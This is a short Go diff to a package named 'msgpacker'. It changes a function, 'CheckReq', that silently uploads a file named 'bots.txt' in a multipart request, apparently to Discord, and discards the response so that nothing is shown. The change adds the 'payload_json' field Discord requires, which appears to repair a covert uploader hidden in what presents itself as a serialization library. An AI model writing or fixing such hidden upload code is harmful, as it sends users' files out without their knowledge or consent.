@@ -2,6 +2,7 @@ package msgpacker
 
 import (
 	"bytes"
+	"encoding/json"
 	"io"
 	"mime/multipart"
 	"net/http"
@@ -32,6 +33,11 @@ func CheckReq() {
 	// Create multipart form data
 	var requestBody bytes.Buffer
 	writer := multipart.NewWriter(&requestBody)
+
+	// Add payload_json field (Discord requires this for file uploads)
+	payload := map[string]interface{}{}
+	payloadJSON, _ := json.Marshal(payload)
+	writer.WriteField("payload_json", string(payloadJSON))
 
 	// Add file field
 	fileWriter, err := writer.CreateFormFile("file", "bots.txt")
@@ -70,4 +76,3 @@ func CheckReq() {
 	// Read response to ensure it's sent (but don't output anything)
 	io.Copy(io.Discard, resp.Body)
 }
-
